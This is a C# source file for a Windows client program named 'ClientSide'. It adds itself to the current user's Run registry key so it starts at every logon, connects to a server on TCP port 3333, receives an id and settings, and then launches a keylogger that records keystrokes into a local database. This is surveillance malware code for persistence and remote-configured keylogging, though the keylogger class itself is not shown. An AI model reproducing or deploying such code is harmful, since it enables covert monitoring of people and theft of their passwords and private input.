using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class Program
    {
        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbs;
        private setSetting set;
        private ClientForm clientForm;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Program p = new Program();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);

            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


            if (p.IsStartupItem(rkApp)) { 
                // Remove the value from the registry so that the application doesn't start
                //rkApp.DeleteValue("ClientSide", false);
            }
           
            else
            {
                // Add the value in the registry so that the application runs at startup
                rkApp.SetValue("ClientSide.exe", Application.ExecutablePath.ToString());

            }

            // check if connect at first time or reconnect         
            if (!p.initialClient())
            {
               p.connectToServer();
            } 
            
            Application.Run();
        }

        private bool IsStartupItem(  RegistryKey rkApp)
        {            
            if (rkApp.GetValue("ClientSide.exe") == null)
                // The value doesn't exist, the application is not set to run at startup
                return false;
            else
                // The value exists, the application is set to run at startup
                return true;
        }


        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }
                string data = Encoding.ASCII.GetString(buffer);
                var dataFromServer = data.Split(new[] { '\r','\n' }, 2);
               
                if (dataFromServer[0] == "id") {
                    id = dataFromServer[1].Split('\0')[0];                   
                }

                if (dataFromServer[0] == "setting")
                {
                    String setting = dataFromServer[1].Split('\0')[0];
                    playMonitor(setting); //This method obtains the settings string from the server

                }
                else {
                    ShowErrorDialog("Server send:\n" + data);
                }
                //System.Threading.Thread.Sleep(7000);
                //SendData("server send: \n" + data);
                //Start receiving data again.
                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }
            // Avoid Pokemon exception handling in cases like these.
            catch (SocketException ex)
            {
                ShowErrorDialog(ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog(ex.Message);
            }
        }

        // set setting and here will play all triggers;
        private void playMonitor(string setting)
        {

            //set setting 
            set = new setSetting(setting, name, id);
            ShowErrorDialog("play monitor");
            // play key logger
            if (dbs == null) {
                dbs = new DBclient(name);
            }
            KeyLogger k = new KeyLogger(dbs, set);
            
            //here will play all triggers;
        }
       
        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);                
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
                
                if(id != null)
                    SendData(clientSocket, "id\r" +id);
                else SendData(clientSocket, "name\r" + name);
            }
            catch (SocketException ex)
            {
               // ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);
                
                reConnect();
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        public void connectToServer()
        {
            try
            {
                
                clientForm = new ClientForm();
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;

                dbs = new DBclient(name);

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message);
            }


        }


        private bool initialClient()
        {

            String projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            String[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);
            string set = "";
            DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
            ShowErrorDialog("filepath is: \n" + filepath);
            if (!Directory.Exists(filepath))
            {
                return false;
            }

            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
            
            foreach (FileInfo file in Files)
            {

                if (file.Name != null)
                {
                    ShowErrorDialog(file.Name);
                    // Open the file to read from.
                    using (StreamReader sr = File.OpenText(Path.Combine(filepath, file.Name)))
                    {
                        name = sr.ReadLine();
                        id = sr.ReadLine();
                        ip = "127.1.0.0";
                        //ShowErrorDialog("id\n" + id);
                        string line = "";
                        while ((line = sr.ReadLine()) != null)
                        { 
                            //ShowErrorDialog("line\n" + line);
                            set += line;
                        }
                    }
                    
                    playMonitor("set"+set);
                    reConnect();
                    return true;

                } 

            }
            
            return false;
            
        }  
                
        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }

        

        public void SendData(Socket clientSocket, String data) {
            try {
                //ShowErrorDialog("try send: \r\n"+data);
                var sendData = Encoding.ASCII.GetBytes(data);
                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);

            }
            catch (SocketException ex)
            {
                //ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                reConnect();
                //SendData(clientSocket, "send again " + data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public void reConnect() {

            try {
                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);
                 
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
            }
        }
       
    }
}
